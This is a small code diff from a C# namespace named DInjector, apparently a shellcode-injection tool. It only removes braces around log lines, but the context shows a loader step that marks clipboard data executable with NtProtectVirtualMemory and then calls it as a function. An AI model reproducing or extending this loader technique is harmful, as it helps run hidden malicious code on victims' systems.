@@ -87,13 +87,9 @@ namespace DInjector
                 out uint _);
 
             if (ntstatus == 0)
-            {
                 Console.WriteLine("(ClipboardPointer) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
-            }
             else
-            {
                 Console.WriteLine($"(ClipboardPointer) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");
-            }
 
             pFunction f = (pFunction)Marshal.GetDelegateForFunctionPointer(clipboardData, typeof(pFunction));
             f();
